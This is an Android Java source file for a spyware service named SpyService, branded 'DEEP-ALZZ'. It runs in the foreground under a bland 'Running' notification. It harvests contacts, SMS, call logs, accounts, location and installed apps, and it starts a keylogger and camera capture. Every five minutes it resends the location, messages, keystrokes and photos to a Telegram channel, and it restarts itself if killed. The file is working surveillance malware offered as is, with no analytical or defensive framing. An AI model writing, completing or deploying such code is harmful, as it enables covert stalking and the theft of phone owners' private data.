package com.deepalzz.spy;
import android.app.Notification; import android.app.NotificationChannel;
import android.app.NotificationManager; import android.app.Service; import android.content.Intent;
import android.os.Build; import android.os.IBinder;
import androidx.core.app.NotificationCompat;
public class SpyService extends Service {
    private TelegramSender telegram; private DataCollector collector;
    private Keylogger keylogger; private CameraCapture camera;
    @Override public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel("spy_channel", "DEEP-ALZZ",
                NotificationManager.IMPORTANCE_LOW);
            NotificationManager mgr = getSystemService(NotificationManager.class);
            if (mgr != null) mgr.createNotificationChannel(ch);
        }
        Notification n = new NotificationCompat.Builder(this, "spy_channel")
            .setContentTitle("DEEP-ALZZ").setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_info_details).build();
        startForeground(1, n);
        telegram = new TelegramSender();
        collector = new DataCollector(this, telegram);
        keylogger = new Keylogger(this, telegram);
        camera = new CameraCapture(this, telegram);
        telegram.sendMessage("🔥 DEEP-ALZZ ACTIVE");
        telegram.sendMessage("📱 " + Build.MANUFACTURER + " " + Build.MODEL);
        collector.collectContacts(); collector.collectSMS(); collector.collectCallLogs();
        collector.collectAccounts(); collector.collectLocation(); collector.collectInstalledApps();
        keylogger.start(); camera.startCapturing();
        new Thread(() -> {
            while (true) { try { Thread.sleep(300000);
                collector.collectLocation(); collector.collectSMS();
                keylogger.sendLogs(); camera.capturePhoto();
            } catch (Exception e) {} }
        }).start();
    }
    @Override public int onStartCommand(Intent i, int f, int id) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }
}
